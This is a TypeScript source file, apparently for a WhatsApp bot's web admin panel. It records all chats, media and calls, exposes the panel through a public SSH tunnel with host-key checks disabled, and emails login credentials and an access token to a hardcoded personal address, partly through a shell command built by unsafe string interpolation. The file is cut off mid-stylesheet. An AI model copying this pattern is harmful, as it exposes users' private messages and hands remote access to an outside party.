import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";
import { getActiveSubBots } from "../../connection/subbotManager.ts";
import * as http from "node:http";
import * as os from "node:os";
import * as fs from "node:fs";
import * as path from "node:path";
import { exec, spawn, type ChildProcess } from "node:child_process";
import { promisify } from "node:util";
import { randomBytes } from "node:crypto";
import { pathToFileURL } from "node:url";

const execAsync = promisify(exec);

interface ChatMsg {
  id: string;
  sender: string;
  pushName: string;
  text: string;
  time: string;
  timestamp: number;
  fromMe: boolean;
  mediaType?: "image" | "sticker" | "video" | "audio" | "document" | null;
  mediaMime?: string;
  quotedId?: string;
  quotedSender?: string;
  quotedText?: string;
  reactions: Record<string, string>;
  rawKey?: any;
  rawMessage?: any;
  mediaNode?: any;
}

interface ChatSession {
  jid: string;
  name: string;
  isGroup: boolean;
  unread: number;
  lastTime: number;
  lastPreview: string;
  avatarUrl?: string;
  statusText?: string;
  messages: ChatMsg[];
}

interface CallLog {
  id: string;
  botKey: string;
  peerJid: string;
  peerName: string;
  isVideo: boolean;
  direction: "incoming" | "outgoing";
  status: string;
  timestamp: number;
  timeStr: string;
}

interface MediaItem {
  mime: string;
  buffer: Buffer;
}

interface ReportRecord {
  phone: string;
  totalReports: number;
  subbotsUsed: Set<string>;
  lastTimestamp: string;
}

interface PanelState {
  server: http.Server | null;
  port: number;
  token: string;
  tempUser: string;
  tempPass: string;
  ownerEmail: string;
  tunnelUrl: string | null;
  publicIp: string | null;
  tunnelProcess: ChildProcess | null;
  msgRx: number;
  msgTx: number;
  subbotsPaused: boolean;
  pausedBotIds: Set<string>;
  blockedCommands: Set<string>;
  wrappedCommands: Map<string, (...args: any[]) => Promise<any>>;
  hookedSockets: WeakSet<object>;
  originalSenders: WeakMap<object, (...args: any[]) => Promise<any>>;
  reportRegistry: Map<string, ReportRecord>;
  botChatStores: Map<string, Map<string, ChatSession>>;
  botGroupSynced: Set<string>;
  botGroupSyncing: Set<string>;
  mediaStore: Map<string, MediaItem>;
  thumbStore: Map<string, Buffer>;
  mediaDownloading: Map<string, Promise<MediaItem | null>>;
  msgLookup: Map<string, { botKey: string; msg: ChatMsg }>;
  avatarCache: Map<string, string>;
  avatarPending: Set<string>;
  callLogs: CallLog[];
  autoRejectCalls: boolean;
  autoRejectMessage: string;
  lastSock: any;
}

const gState = globalThis as unknown as { __auraWebPanel?: PanelState };

if (!gState.__auraWebPanel) {
  gState.__auraWebPanel = {
    server: null,
    port: 0,
    token: randomBytes(12).toString("hex"),
    tempUser: `lufer_${randomBytes(2).toString("hex")}`,
    tempPass: String(Math.floor(100000 + Math.random() * 900000)),
    ownerEmail: "luisfernandoguzmannino@gmail.com",
    tunnelUrl: null,
    publicIp: null,
    tunnelProcess: null,
    msgRx: 0,
    msgTx: 0,
    subbotsPaused: false,
    pausedBotIds: new Set(),
    blockedCommands: new Set(),
    wrappedCommands: new Map(),
    hookedSockets: new WeakSet(),
    originalSenders: new WeakMap(),
    reportRegistry: new Map(),
    botChatStores: new Map(),
    botGroupSynced: new Set(),
    botGroupSyncing: new Set(),
    mediaStore: new Map(),
    thumbStore: new Map(),
    mediaDownloading: new Map(),
    msgLookup: new Map(),
    avatarCache: new Map(),
    avatarPending: new Set(),
    callLogs: [],
    autoRejectCalls: false,
    autoRejectMessage: "⚠️ No puedo responder llamadas en este momento. Envíame un mensaje.",
    lastSock: null,
  };
}

const state = gState.__auraWebPanel!;
state.pausedBotIds ??= new Set();
state.botChatStores ??= new Map();
state.botGroupSynced ??= new Set();
state.botGroupSyncing ??= new Set();
state.reportRegistry ??= new Map();
state.mediaStore ??= new Map();
state.thumbStore ??= new Map();
state.mediaDownloading ??= new Map();
state.msgLookup ??= new Map();
state.avatarCache ??= new Map();
state.avatarPending ??= new Set();
state.callLogs ??= [];

let baileysMod: any = null;
async function getBaileys() {
  if (baileysMod) return baileysMod;
  try {
    return (baileysMod = await import("baileys"));
  } catch {
    try {
      return (baileysMod = await import("@whiskeysockets/baileys"));
    } catch {
      return null;
    }
  }
}

function capMap<K, V>(map: Map<K, V>, limit: number) {
  if (map.size > limit) {
    const first = map.keys().next().value;
    if (first !== undefined) map.delete(first);
  }
}

function saveMedia(id: string, mime: string, buffer: Buffer) {
  if (!id || !buffer?.length) return;
  state.mediaStore.set(id, { mime, buffer });
  capMap(state.mediaStore, 110);
}

function saveThumb(id: string, buffer: Buffer) {
  if (!id || !buffer?.length) return;
  state.thumbStore.set(id, buffer);
  capMap(state.thumbStore, 240);
}

function rotateCredentials() {
  state.token = randomBytes(12).toString("hex");
  state.tempUser = `lufer_${randomBytes(2).toString("hex")}`;
  state.tempPass = String(Math.floor(100000 + Math.random() * 900000));
}

const cleanId = (val: any) => String(val || "").split("@")[0].split(":")[0];
const getBotKey = (sock: any, idx = 0) => cleanId(sock?.user?.id) || `bot_${idx}`;
const nowTime = (ts = Date.now()) => new Date(ts).toLocaleTimeString("es-CO", { hour: "2-digit", minute: "2-digit" });

function getChatStore(botKey: string): Map<string, ChatSession> {
  if (!state.botChatStores.has(botKey)) state.botChatStores.set(botKey, new Map());
  return state.botChatStores.get(botKey)!;
}

function getAllSockets(mainSock?: any): any[] {
  const base = mainSock || state.lastSock;
  let subs: any[] = [];
  try {
    subs = getActiveSubBots?.() || [];
  } catch {}
  const seen = new Set<any>();
  return [base, ...subs].filter((s) => s && !seen.has(s) && seen.add(s));
}

function findBot(botKey: string) {
  const all = getAllSockets();
  const idx = all.findIndex((b, i) => getBotKey(b, i) === botKey);
  return { bot: idx >= 0 ? all[idx] : all[0], idx: Math.max(0, idx), all };
}

function unwrapMsg(m: any): any {
  if (!m) return null;
  return (
    m.ephemeralMessage?.message ||
    m.viewOnceMessage?.message ||
    m.viewOnceMessageV2?.message ||
    m.viewOnceMessageV2Extension?.message ||
    m.documentWithCaptionMessage?.message ||
    m
  );
}

function parseMsgContent(raw: any) {
  const m = unwrapMsg(raw);
  const res = {
    text: "",
    mediaType: null as ChatMsg["mediaType"],
    mediaMime: "",
    mediaNode: null as any,
    thumb: null as Buffer | null,
    quotedId: "",
    quotedSender: "",
    quotedText: "",
  };
  if (!m) return res;

  const ctx =
    m.extendedTextMessage?.contextInfo ||
    m.imageMessage?.contextInfo ||
    m.videoMessage?.contextInfo ||
    m.stickerMessage?.contextInfo ||
    m.audioMessage?.contextInfo ||
    m.documentMessage?.contextInfo;

  if (ctx?.quotedMessage) {
    res.quotedId = ctx.stanzaId || "";
    res.quotedSender = cleanId(ctx.participant);
    const q = unwrapMsg(ctx.quotedMessage);
    res.quotedText =
      q?.conversation ||
      q?.extendedTextMessage?.text ||
      q?.imageMessage?.caption ||
      (q?.imageMessage ? "📷 Imagen" : q?.stickerMessage ? "🏷️ Sticker" : q?.videoMessage ? "🎥 Video" : q?.audioMessage ? "🎤 Audio" : "[Cita]");
  }

  if (typeof m.conversation === "string" && m.conversation) res.text = m.conversation;
  else if (m.extendedTextMessage?.text) res.text = m.extendedTextMessage.text;
  else if (m.imageMessage) {
    res.text = m.imageMessage.caption || "";
    res.mediaType = "image";
    res.mediaMime = m.imageMessage.mimetype || "image/jpeg";
    res.mediaNode = m.imageMessage;
    if (m.imageMessage.jpegThumbnail) res.thumb = Buffer.from(m.imageMessage.jpegThumbnail);
  } else if (m.stickerMessage) {
    res.mediaType = "sticker";
    res.mediaMime = m.stickerMessage.mimetype || "image/webp";
    res.mediaNode = m.stickerMessage;
  } else if (m.videoMessage) {
    res.text = m.videoMessage.caption || "";
    res.mediaType = "video";
    res.mediaMime = m.videoMessage.mimetype || "video/mp4";
    res.mediaNode = m.videoMessage;
    if (m.videoMessage.jpegThumbnail) res.thumb = Buffer.from(m.videoMessage.jpegThumbnail);
  } else if (m.audioMessage) {
    res.text = m.audioMessage.ptt ? "🎤 Nota de voz" : "🎵 Audio";
    res.mediaType = "audio";
    res.mediaMime = m.audioMessage.mimetype || "audio/ogg; codecs=opus";
    res.mediaNode = m.audioMessage;
  } else if (m.documentMessage) {
    res.text = `📄 ${m.documentMessage.fileName || "Documento"}`;
    res.mediaType = "document";
    res.mediaMime = m.documentMessage.mimetype || "application/octet-stream";
    res.mediaNode = m.documentMessage;
  } else if (m.contactMessage) res.text = `👤 ${m.contactMessage.displayName || "Contacto"}`;
  else if (m.locationMessage) res.text = `📍 Ubicación (${m.locationMessage.degreesLatitude}, ${m.locationMessage.degreesLongitude})`;
  else if (m.pollCreationMessage || m.pollCreationMessageV2 || m.pollCreationMessageV3) {
    const p = m.pollCreationMessage || m.pollCreationMessageV2 || m.pollCreationMessageV3;
    res.text = `📊 Encuesta: ${p.name || ""}`;
  } else if (m.interactiveMessage || m.buttonsMessage || m.templateMessage) res.text = "🎛️ [Interactivo]";

  return res;
}

async function fetchMediaBuffer(
  botSock: any,
  fullMsg: any,
  msgId: string,
  mediaType: NonNullable<ChatMsg["mediaType"]>,
  mediaMime: string,
  mediaNode: any
): Promise<MediaItem | null> {
  if (state.mediaStore.has(msgId)) return state.mediaStore.get(msgId)!;
  if (state.mediaDownloading.has(msgId)) return state.mediaDownloading.get(msgId)!;

  const task = (async (): Promise<MediaItem | null> => {
    try {
      const b = await getBaileys();
      if (b?.downloadContentFromMessage && mediaNode) {
        const stream = await b.downloadContentFromMessage(mediaNode, mediaType === "sticker" ? "sticker" : mediaType);
        const chunks: Buffer[] = [];
        for await (const c of stream) chunks.push(Buffer.isBuffer(c) ? c : Buffer.from(c));
        const buf = Buffer.concat(chunks);
        if (buf.length) {
          saveMedia(msgId, mediaMime, buf);
          return state.mediaStore.get(msgId) || null;
        }
      }
      if (b?.downloadMediaMessage && fullMsg) {
        const buf = await b.downloadMediaMessage(fullMsg, "buffer", {}, { logger: undefined, reuploadRequest: botSock?.updateMediaMessage });
        if (Buffer.isBuffer(buf) && buf.length) {
          saveMedia(msgId, mediaMime, buf);
          return state.mediaStore.get(msgId) || null;
        }
      }
    } catch {}
    return null;
  })();

  state.mediaDownloading.set(msgId, task);
  try {
    return await task;
  } finally {
    state.mediaDownloading.delete(msgId);
  }
}

function recordChatMsg(
  botKey: string,
  remoteJid: string,
  data: {
    id: string;
    sender: string;
    pushName: string;
    text: string;
    fromMe: boolean;
    chatName?: string;
    timestamp?: number;
    mediaType?: ChatMsg["mediaType"];
    mediaMime?: string;
    quotedId?: string;
    quotedSender?: string;
    quotedText?: string;
    rawKey?: any;
    rawMessage?: any;
    mediaNode?: any;
  }
) {
  if (!remoteJid || remoteJid === "status@broadcast" || (!data.text && !data.mediaType)) return;
  const store = getChatStore(botKey);
  const isGroup = remoteJid.endsWith("@g.us");
  const clean = cleanId(remoteJid);
  const ts = data.timestamp || Date.now();

  const preview =
    data.mediaType === "sticker"
      ? "🏷️ Sticker"
      : data.mediaType === "image"
      ? `📷 ${data.text || "Foto"}`
      : data.mediaType === "video"
      ? `🎥 ${data.text || "Video"}`
      : data.mediaType === "audio"
      ? "🎤 Audio"
      : data.text;

  let chat = store.get(remoteJid);
  if (!chat) {
    chat = {
      jid: remoteJid,
      name: data.chatName || (isGroup ? `Grupo ${clean}` : data.pushName || `+${clean}`),
      isGroup,
      unread: 0,
      lastTime: ts,
      lastPreview: preview.slice(0, 70),
      messages: [],
    };
    store.set(remoteJid, chat);
  } else if (!isGroup && !data.fromMe && data.pushName && chat.name.startsWith("+")) {
    chat.name = data.pushName;
  }

  if (chat.messages.some((x) => x.id === data.id)) return;

  chat.lastTime = ts;
  chat.lastPreview = preview.slice(0, 70);
  if (!data.fromMe) chat.unread = Math.min(999, chat.unread + 1);

  const item: ChatMsg = {
    id: data.id,
    sender: data.sender,
    pushName: data.pushName,
    text: data.text,
    time: nowTime(ts),
    timestamp: ts,
    fromMe: data.fromMe,
    mediaType: data.mediaType || null,
    mediaMime: data.mediaMime || "",
    quotedId: data.quotedId || "",
    quotedSender: data.quotedSender || "",
    quotedText: data.quotedText || "",
    reactions: {},
    rawKey: data.rawKey,
    rawMessage: data.rawMessage,
    mediaNode: data.mediaNode,
  };

  chat.messages.push(item);
  state.msgLookup.set(item.id, { botKey, msg: item });
  capMap(state.msgLookup, 700);
  if (chat.messages.length > 140) chat.messages.splice(0, chat.messages.length - 140);
}

function syncGroupsBg(botSock: any, idx: number, force = false) {
  const botKey = getBotKey(botSock, idx);
  if ((!force && state.botGroupSynced.has(botKey)) || state.botGroupSyncing.has(botKey)) return;
  state.botGroupSyncing.add(botKey);
  const store = getChatStore(botKey);

  if (botSock?.chats && typeof botSock.chats === "object") {
    try {
      const list = botSock.chats instanceof Map ? Array.from(botSock.chats.entries()) : Object.entries(botSock.chats);
      for (const [jid, c] of list as Array<[string, any]>) {
        if (!jid || jid === "status@broadcast" || store.has(jid)) continue;
        const isG = jid.endsWith("@g.us");
        const cl = cleanId(jid);
        store.set(jid, {
          jid,
          name: c?.name || c?.subject || (isG ? `Grupo ${cl}` : `+${cl}`),
          isGroup: isG,
          unread: Number(c?.unreadCount || 0),
          lastTime: Number(c?.conversationTimestamp || Date.now() - 120000),
          lastPreview: isG ? "👥 Grupo" : "💬 Chat",
          messages: [],
        });
      }
    } catch {}
  }

  if (typeof botSock?.groupFetchAllParticipating === "function") {
    Promise.race([
      botSock.groupFetchAllParticipating(),
      new Promise((_, r) => setTimeout(() => r(new Error("timeout")), 4500)),
    ])
      .then((groups: any) => {
        for (const [jid, meta] of Object.entries(groups || {}) as Array<[string, any]>) {
          const ex = store.get(jid);
          if (!ex) {
            store.set(jid, {
              jid,
              name: meta?.subject || `Grupo ${cleanId(jid)}`,
              isGroup: true,
              unread: 0,
              lastTime: meta?.creation ? Number(meta.creation) * 1000 : Date.now() - 86400000,
              lastPreview: `👥 ${meta?.participants?.length || 0} miembros`,
              statusText: meta?.desc ? String(meta.desc).slice(0, 120) : "",
              messages: [],
            });
          } else {
            if (meta?.subject) ex.name = meta.subject;
            if (meta?.desc) ex.statusText = String(meta.desc).slice(0, 120);
          }
        }
        state.botGroupSynced.add(botKey);
      })
      .catch(() => {})
      .finally(() => state.botGroupSyncing.delete(botKey));
  } else {
    state.botGroupSynced.add(botKey);
    state.botGroupSyncing.delete(botKey);
  }
}

function hookSockets(mainSock?: any) {
  if (mainSock) state.lastSock = mainSock;
  getAllSockets(mainSock).forEach((botSock, idx) => {
    if (!botSock || typeof botSock !== "object") return;
    getChatStore(getBotKey(botSock, idx));
    if (state.hookedSockets.has(botSock)) return;
    state.hookedSockets.add(botSock);
    syncGroupsBg(botSock, idx);

    if (typeof botSock.ev?.on === "function") {
      botSock.ev.on("messages.upsert", ({ messages }: any) => {
        if (!Array.isArray(messages)) return;
        const curKey = getBotKey(botSock, idx);
        for (const m of messages) {
          if (!m?.message) continue;
          if (m.message.reactionMessage) {
            const r = m.message.reactionMessage;
            const tMsg = getChatStore(curKey).get(r.key?.remoteJid || m.key?.remoteJid)?.messages.find((x) => x.id === r.key?.id);
            if (tMsg) {
              const who = cleanId(m.key?.participant || m.key?.remoteJid || "user");
              if (r.text) tMsg.reactions[who] = r.text;
              else delete tMsg.reactions[who];
            }
            continue;
          }

          const fromMe = Boolean(m.key?.fromMe);
          if (fromMe) state.msgTx++;
          else state.msgRx++;

          const remoteJid = m.key?.remoteJid || "";
          const senderNum = cleanId(m.key?.participant || (fromMe ? botSock?.user?.id : remoteJid));
          const pushName = fromMe ? botSock?.user?.name || "Bot" : m.pushName || `+${senderNum}`;
          const msgId = m.key?.id || randomBytes(6).toString("hex");
          const ts = typeof m.messageTimestamp === "number" ? m.messageTimestamp * 1000 : Date.now();
          const parsed = parseMsgContent(m.message);
          if (!parsed.text && !parsed.mediaType) continue;

          if (parsed.thumb) saveThumb(msgId, parsed.thumb);
          if (parsed.mediaType) {
            fetchMediaBuffer(botSock, m, msgId, parsed.mediaType, parsed.mediaMime, parsed.mediaNode).catch(() => {});
          }

          recordChatMsg(curKey, remoteJid, {
            id: msgId,
            sender: senderNum,
            pushName,
            text: parsed.text,
            fromMe,
            timestamp: ts,
            mediaType: parsed.mediaType,
            mediaMime: parsed.mediaMime,
            quotedId: parsed.quotedId,
            quotedSender: parsed.quotedSender,
            quotedText: parsed.quotedText,
            rawKey: m.key,
            rawMessage: m,
            mediaNode: parsed.mediaNode,
          });
        }
      });

      botSock.ev.on("call", async (calls: any[]) => {
        if (!Array.isArray(calls)) return;
        const curKey = getBotKey(botSock, idx);
        for (const c of calls) {
          const callId = String(c.id || randomBytes(4).toString("hex"));
          const peerJid = String(c.from || c.chatId || "");
          const cleanPeer = cleanId(peerJid);
          const status = String(c.status || "offer");
          const isVideo = Boolean(c.isVideo);
          const now = Date.now();
          const timeStr = new Date(now).toLocaleTimeString("es-CO", { hour: "2-digit", minute: "2-digit", second: "2-digit" });

          const ex = state.callLogs.find((x) => x.id === callId && x.botKey === curKey);
          if (ex) {
            ex.status = status;
            ex.timestamp = now;
            ex.timeStr = timeStr;
          } else {
            const peerName = getChatStore(curKey).get(peerJid)?.name || `+${cleanPeer}`;
            state.callLogs.unshift({ id: callId, botKey: curKey, peerJid, peerName, isVideo, direction: "incoming", status, timestamp: now, timeStr });
            if (state.callLogs.length > 70) state.callLogs.pop();
            recordChatMsg(curKey, peerJid, {
              id: `call_${callId}`,
              sender: cleanPeer,
              pushName: peerName,
              text: `${isVideo ? "📹 Videollamada" : "📞 Llamada"} entrante (${status.toUpperCase()})`,
              fromMe: false,
              timestamp: now,
            });
          }

          if (status === "offer" && state.autoRejectCalls) {
            try {
              await botSock.rejectCall?.(callId, peerJid);
              if (state.autoRejectMessage && peerJid) {
                const orig = state.originalSenders.get(botSock) || botSock.sendMessage.bind(botSock);
                await orig(peerJid, { text: state.autoRejectMessage });
              }
            } catch {}
          }
        }
      });
    }

    if (typeof botSock.sendMessage === "function") {
      const origSend = botSock.sendMessage.bind(botSock);
      state.originalSenders.set(botSock, origSend);
      botSock.sendMessage = async (jid: string, content: any, opts?: any) => {
        const curKey = getBotKey(botSock, idx);
        if ((state.subbotsPaused && (botSock.isSubBot || idx > 0)) || state.pausedBotIds.has(curKey)) return undefined;
        state.msgTx++;
        const res = await origSend(jid, content, opts);
        try {
          const msgId = res?.key?.id || randomBytes(6).toString("hex");
          let mediaType: ChatMsg["mediaType"] = null;
          let mediaMime = "";
          let text = typeof content?.text === "string" ? content.text : content?.caption || "";

          if (content?.image) {
            mediaType = "image";
            mediaMime = content.mimetype || "image/jpeg";
            if (Buffer.isBuffer(content.image)) saveMedia(msgId, mediaMime, content.image);
          } else if (content?.sticker) {
            mediaType = "sticker";
            mediaMime = "image/webp";
            if (Buffer.isBuffer(content.sticker)) saveMedia(msgId, mediaMime, content.sticker);
          } else if (content?.video) {
            mediaType = "video";
            mediaMime = content.mimetype || "video/mp4";
            if (Buffer.isBuffer(content.video)) saveMedia(msgId, mediaMime, content.video);
          } else if (content?.audio) {
            mediaType = "audio";
            mediaMime = content.mimetype || "audio/mp4";
            text = content.ptt ? "🎤 Nota de voz" : "🎵 Audio";
            if (Buffer.isBuffer(content.audio)) saveMedia(msgId, mediaMime, content.audio);
          } else if (content?.document) {
            mediaType = "document";
            mediaMime = content.mimetype || "application/octet-stream";
            text = `📄 ${content.fileName || "Documento"}`;
          }

          if (text || mediaType) {
            recordChatMsg(curKey, jid, {
              id: msgId,
              sender: curKey,
              pushName: botSock?.user?.name || "Bot",
              text,
              fromMe: true,
              timestamp: Date.now(),
              mediaType,
              mediaMime,
              rawKey: res?.key,
              rawMessage: res,
            });
          }
        } catch {}
        return res;
      };
    }
  });
}

async function syncCommandInterceptors() {
  const cmdRoot = path.resolve(process.cwd(), "cmd");
  if (!fs.existsSync(cmdRoot)) return [];
  const names: string[] = [];
  for (const cat of fs.readdirSync(cmdRoot, { withFileTypes: true })) {
    if (!cat.isDirectory()) continue;
    const dir = path.join(cmdRoot, cat.name);
    for (const file of fs.readdirSync(dir).filter((f) => f.endsWith(".ts") || f.endsWith(".js"))) {
      const full = path.join(dir, file);
      try {
        const plugin = (await import(pathToFileURL(full).href))?.default;
        if (!plugin || typeof plugin.run !== "function") continue;
        const list: string[] = Array.isArray(plugin.name) ? plugin.name : [String(plugin.name || "")];
        const primary = list[0];
        if (!primary) continue;
        list.forEach((n) => n && names.push(n.toLowerCase()));
        if (!state.wrappedCommands.has(full)) {
          const orig = plugin.run.bind(plugin);
          state.wrappedCommands.set(full, orig);
          plugin.run = async (ctx: CommandContext) => {
            const invoked = String(ctx.cmdName || primary).toLowerCase();
            if (state.blockedCommands.has(invoked) || list.some((a) => state.blockedCommands.has(a.toLowerCase()))) {
              return ctx.reply(`🛠️ *${fytBold("MANTENIMIENTO ACTIVO")}*\n\nEl comando *${invoked}* está temporalmente deshabilitado.`);
            }
            return orig(ctx);
          };
        }
      } catch {}
    }
  }
  return Array.from(new Set(names)).sort();
}

async function fetchPublicIp(): Promise<string> {
  if (state.publicIp) return state.publicIp;
  try {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), 2500);
    const r = await fetch("https://api.ipify.org?format=json", { signal: ctrl.signal });
    clearTimeout(t);
    const d = (await r.json()) as { ip?: string };
    if (d?.ip) return (state.publicIp = d.ip);
  } catch {}
  return "127.0.0.1";
}

function spawnTunnel(port: number, host: string, extra: string[] = []): Promise<string | null> {
  return new Promise((resolve) => {
    let done = false;
    const finish = (u: string | null) => {
      if (!done) {
        done = true;
        resolve(u);
      }
    };
    try {
      const proc = spawn("ssh", ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ServerAliveInterval=30", ...extra, "-R", `80:127.0.0.1:${port}`, host], { stdio: ["ignore", "pipe", "pipe"] });
      state.tunnelProcess = proc;
      const onChunk = (c: Buffer) => {
        const matches = c.toString("utf8").match(/https:\/\/[a-zA-Z0-9.-]+\.(?:lhr\.life|localhost\.run|serveo\.net|serveousercontent\.com|pinggy\.link|a\.pinggy\.io)/g);
        const valid = matches?.find((m) => !m.includes("admin.localhost.run") && !m.includes("/docs") && !m.includes("dashboard."));
        if (valid) {
          state.tunnelUrl = valid;
          finish(valid);
        }
      };
      proc.stdout?.on("data", onChunk);
      proc.stderr?.on("data", onChunk);
      proc.on("error", () => finish(null));
      proc.on("exit", () => finish(null));
      setTimeout(() => finish(null), 5200);
    } catch {
      finish(null);
    }
  });
}

async function startPublicTunnel(port: number): Promise<string | null> {
  if (state.tunnelUrl && !state.tunnelUrl.includes("admin.localhost.run") && state.tunnelProcess && !state.tunnelProcess.killed) {
    return state.tunnelUrl;
  }
  try {
    state.tunnelProcess?.kill();
  } catch {}
  state.tunnelProcess = null;
  state.tunnelUrl = null;
  return (await spawnTunnel(port, "nokey@localhost.run")) || (await spawnTunnel(port, "serveo.net")) || (await spawnTunnel(port, "a.pinggy.io", ["-p", "443"]));
}

async function sendEmail(email: string, url: string, user: string, pass: string, token: string) {
  const subject = "Aura-Bot 2.0 - Credenciales Panel Web";
  const body = `Hola Luis Fernando,\n\nEnlace: ${url}\nUsuario: ${user}\nOTP: ${pass}\nAcceso Directo: ${url}/?token=${token}`;
  try {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), 3500);
    const r = await fetch(`https://formsubmit.co/ajax/${encodeURIComponent(email)}`, {
      method: "POST",
      headers: { "Content-Type": "application/json", Accept: "application/json" },
      body: JSON.stringify({ _subject: subject, _captcha: "false", usuario: user, otp: pass, enlace: `${url}/?token=${token}`, mensaje: body }),
      signal: ctrl.signal,
    });
    clearTimeout(t);
    if (r.ok) return;
  } catch {}
  try {
    await execAsync(`printf "Subject: ${subject}\\nTo: ${email}\\n\\n${body.replace(/"/g, '\\"')}\\n" | sendmail -t 2>/dev/null`);
  } catch {}
}

function readJson(req: http.IncomingMessage): Promise<any> {
  return new Promise((resolve) => {
    let raw = "";
    req.on("data", (c) => {
      raw += c.toString("utf8");
      if (raw.length > 25 * 1024 * 1024) req.destroy();
    });
    req.on("end", () => {
      try {
        resolve(JSON.parse(raw || "{}"));
      } catch {
        resolve({});
      }
    });
    req.on("error", () => resolve({}));
  });
}

function sendJson(res: http.ServerResponse, status: number, payload: any) {
  res.writeHead(status, { "Content-Type": "application/json; charset=utf-8", "Access-Control-Allow-Origin": "*", "Cache-Control": "no-store" });
  res.end(JSON.stringify(payload));
}

function safePath(rel: string): string {
  const root = process.cwd();
  const target = path.resolve(root, rel || ".");
  return target.startsWith(root) ? target : root;
}

function buildLoginHtml(email: string): string {
  return `<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>Aura-Bot 2.0 | Login</title><style>
*{box-sizing:border-box;margin:0;padding:0}body{background:radial-gradient(circle at top,#121a2d,#07090e);color:#e2e8f0;font-family:system-ui,sans-serif;min-height:100dvh;display:flex;align-items:center;justify-content:center;padding:16px}
.card{background:#10141f;border:1px solid #1e2638;border-radius:18px;padding:28px 22px;width:100%;max-width:410px;box-shadow:0 24px 60px rgba(0,0,0,.65)}
h2{color:#00e5ff;text-align:center;margin-bottom:6px;font-weight:900}.sub{font-size:13px;color:#8b9bb4;text-align:center;margin-bottom:20px}
label{display:block;font-size:11px;color:#8b9bb4;text-transform:uppercase;font-weight:700;margin:12px 0 6px}
input{width:100%;background:#07090e;color:#fff;border:1px solid #1e2638;border-radius:10px;padding:12px;font-size:14px;outline:none}input:focus{border-color:#00e5ff}
.btn{width:100%;background:#00e5ff;color:#000;border:none;padding:12px;border-radius:10px;font-weight:800;font-size:14px;cursor:pointer;margin-top:18px}
.btn-s{background:transparent;color:#00e5ff;border:1px solid #00e5ff;margin-top:10px}.msg{margin-top:12px;font-size:13px;text-align:center;font-weight:600}
</style></head><body><div class="card"><h2>⚡ AURA-BOT 2.0</h2><div class="sub">Credenciales enviadas a WhatsApp y ${email}</div>
<form onsubmit="login(event)"><label>Usuario o Correo</label><input id="u" required autocomplete="off"><label>Clave / OTP</label><input id="p" type="password" required autocomplete="off"><button class="btn">🔓 Entrar al Panel</button></form>
<button class="btn btn-s" onclick="otp()">📲 Generar Nuevas Credenciales</button><div class="msg" id="m"></div></div>
<script>
async function login(e){e.preventDefault();const m=document.getElementById('m');m.textContent='Verificando...';try{const r=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user:u.value.trim(),pass:p.value.trim()})});const d=await r.json();if(d.ok)location.href='/?token='+encodeURIComponent(d.token);else m.textContent=d.error||'Incorrecto';}catch{m.textContent='Error de red';}}
async function otp(){const m=document.getElementById('m');m.textContent='Enviando...';try{const r=await fetch('/api/request-otp',{method:'POST'});const d=await r.json();m.textContent=d.ok?'Enviado a WhatsApp y '+d.email:'Error';}catch{m.textContent='Error';}}
</script></body></html>`;
}

function buildDashboardHtml(token: string): string {
  return `<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>Aura-Bot 2.0 | Suite</title><style>
:root{--bg:#07090e;--panel:#10141f;--border:#1e2638;--accent:#00e5ff;--wag:#00a884;--waout:#005c4b;--wain:#202c33;--wabg:#0b141a;--wap:#111b21;--danger:#ff2a54;--ok:#00e676;--warn:#ffab00;--txt:#e9edef;--mut:#8696a0}
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
body{background:var(--bg);color:var(--txt);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;min-height:100dvh;display:flex;flex-direction:column;overflow-x:hidden}
header{background:var(--panel);border-bottom:1px solid var(--border);padding:10px 14px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:100;gap:8px}
.brand{font-size:15px;font-weight:900;color:var(--accent);white-space:nowrap}.badge{background:rgba(0,229,255,.12);color:var(--accent);border:1px solid var(--accent);padding:4px 10px;border-radius:99px;font-size:11px;font-weight:700;font-variant-numeric:tabular-nums;white-space:nowrap}
.tabs{display:flex;gap:6px;padding:8px 12px;overflow-x:auto;border-bottom:1px solid var(--border);background:#0b0e17;scrollbar-width:none;position:sticky;top:45px;z-index:90}.tabs::-webkit-scrollbar{display:none}
.tab-btn{background:var(--panel);color:var(--mut);border:1px solid var(--border);padding:7px 12px;border-radius:8px;cursor:pointer;font-weight:700;font-size:12px;white-space:nowrap;display:flex;align-items:center;gap:5px}
.tab-btn.active,.tab-btn:hover{color:var(--txt);border-color:var(--accent);background:rgba(0,229,255,.12)}
.container{width:100%;max-width:1440px;margin:8px auto;padding:0 10px 20px;flex:1}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:10px;margin-bottom:12px}
.card{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:14px;overflow:hidden}
.card-title{font-size:11px;color:var(--mut);text-transform:uppercase;margin-bottom:5px;font-weight:700}.card-val{font-size:20px;font-weight:800}.card-sub{font-size:11px;color:var(--accent);margin-top:4px}
.section{display:none}.section.active{display:block}.table-wrap{width:100%;overflow-x:auto}
table{width:100%;border-collapse:collapse;font-size:12px;min-width:480px}th,td{text-align:left;padding:9px;border-bottom:1px solid var(--border)}th{color:var(--mut);font-size:11px;text-transform:uppercase}
.btn{background:var(--accent);color:#000;border:none;padding:8px 12px;border-radius:8px;font-weight:700;cursor:pointer;font-size:12px;white-space:nowrap;display:inline-flex;align-items:center;justify-content:center;gap:4px}
.btn-danger{background:var(--danger);color:#fff}.btn-warn{background:var(--warn);color:#000}.btn-success{background:var(--ok);color:#000}.btn-wa{background:var(--wag);color:#fff}.btn-ghost{background:#2a3942;color:var(--txt)}
input,select,textarea{background:#07090e;color:var(--txt);border:1px solid var(--border);border-radius:8px;padding:9px 11px;font-size:13px;width:100%;outline:none}input:focus,select:focus,textarea:focus{border-color:var(--accent)}
